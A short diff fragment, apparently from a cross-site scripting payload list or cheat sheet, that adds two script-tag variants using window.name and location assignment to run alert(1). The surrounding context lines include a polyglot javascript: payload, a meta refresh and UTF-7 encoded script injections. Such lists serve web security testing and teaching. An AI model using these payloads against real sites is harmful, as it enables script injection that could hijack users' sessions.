@@ -1022,6 +1022,8 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>var{a:onerror}={a:alert};throw 1<\/script>
 <script>var{haha:onerror=alert}=0;throw 1<\/script>
 <script>window.name='javascript:alert(1)';<\/script><svg onload=location=name>
+<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+{a:location=name}+\"\")<\/script>
+<script>window.name='javascript:alert(1)';function blah(){}\nblah(\"\"+new class b{toString=e=>location=name}+\"\")<\/script>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
